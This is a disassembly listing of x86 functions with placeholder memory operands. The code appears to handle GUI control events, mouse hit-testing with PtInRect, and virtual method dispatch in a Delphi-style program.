push sub_43e928
push ebp
call sub_43e934
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43e9b4
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43ea40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43ea78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43e4f8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4544cc
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403320
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4544cc
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403320
sub_43eafc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43cff4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43d6bc
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43ea78
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43eb48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43cff4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43eb64
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43cff4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43d6bc
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43ea78
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403320
sub_43ebbc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43e498
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43e42c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43e498
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43ec58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43ea78
pop esi
pop ebx
retn
sub_43ec7d
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43ea78
pop esi
pop ebx
retn
sub_43eca3
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43ea78
pop esi
pop ebx
retn
sub_43eccd
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43ea78
pop esi
pop ebx
retn
sub_43ecf8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43ed28
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43e4f8
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4544cc
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403320
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4544cc
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403320
sub_43eda0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43edd8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4544cc
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403320
sub_43ee10
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43d6bc
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43edd8
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406948
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403320
sub_43ee88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43edd8
pop esi
pop ebx
retn
sub_43eea8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43edd8
pop esi
pop ebx
retn
sub_43eec8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_4544cc
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403320
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_448568
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ef20
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43d6ac
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43d6bc
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43e62c
pop esi
retn
sub_43ef60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43e660
sub_43f00e
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43d8cc
mov cl 0x1
sub_43f050
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43d624
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43d624
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43f080
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43f0a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406948
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403320
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43e62c
mov [ ebx + 0xc ] eax
sub_43f148
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43d578
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43d578
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43f1dc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_40306c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43cc18
mov edx [ esp ]
mov eax esi
call sub_43cbf4
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43cea0
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43cee4
sub_43f260
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412cac
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43cf9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412cfc
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43ce44
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f2ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43f1dc
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_443c60
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43f260
pop ecx
jmp r-xdata
sub_43f34c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43f43a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f441
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43d4b4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43d484
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43d484
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404304
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403f4c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43d3a4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43f448
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403320
sub_43f474
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43f494
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43f4b4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43f4d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43f4f4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43f514
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43f534
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41aecc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43cad8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403320
sub_43f56c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f608
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414800
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_449d58
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_449e90
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43d484
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_449bf0
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_449fb0
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f60f
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_43f618
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_43f654
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_43f618
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_43f704
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_4032b0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_43f738
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43f758
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403320
test al al
je r-xdata
mov eax edi
call sub_43f798
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_43f7c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_43f7f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406948
mov eax esp
call sub_412d24
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43cfc8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403320
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403320
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43cff4
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412d24
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412cac
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43cf9c
sub_43f918
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_43f958
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c1c8
mov eax esi
mov edx [ r-xdata ]
call sub_4032d4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43f98c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_43fa84
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43c584
push ebx
push sub_44141c
call sub_41bb0c
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e4a4
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41e64c
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403448
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b29c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403f4c
lea eax [ ebx + 0x188 ]
call sub_403ef8
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
